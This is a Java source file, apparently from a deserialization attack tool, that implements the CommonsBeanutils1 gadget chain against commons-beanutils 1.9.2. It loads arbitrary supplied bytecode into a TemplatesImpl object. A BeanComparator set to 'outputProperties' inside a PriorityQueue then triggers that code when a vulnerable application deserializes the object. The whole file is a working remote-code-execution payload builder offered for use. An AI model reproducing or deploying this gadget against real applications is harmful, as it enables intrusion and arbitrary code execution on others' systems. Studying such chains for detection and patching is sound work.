package com.bcvgh.core.unser.gadgets.bytecode;

import com.bcvgh.core.unser.core.pojo.UnSerInput;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.bcvgh.core.unser.annotation.DependenciesVersion;
import com.bcvgh.core.unser.annotation.RequireParameter;
import com.bcvgh.core.unser.gadgets.ObjectPayload;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

import static com.bcvgh.core.unser.gadgets.util.Reflections.setFieldValue;

@DependenciesVersion("Commons-beanutils-1.9.2")
@RequireParameter("ResourcePath")
public class CB1 implements ObjectPayload {
    @Override
    public <T> Object getObject(UnSerInput unSerInput) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                unSerInput.getBytecode()
        });
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        final BeanComparator comparator = new BeanComparator(null,
                String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,
                comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});
        return queue;
    }

//    public static byte[] getBytecode(final Class classname) throws NotFoundException, IOException, CannotCompileException {
//        ClassPool pool = ClassPool.getDefault();
//        CtClass clazz =
//                pool.get(classname.getName());
////        JavaClass cls = Repository.lookupClass(classname);
////        byte[] bytes = cls.getBytes();
//        byte[] bytes = clazz.toBytecode();
//        return bytes;
//    }
}
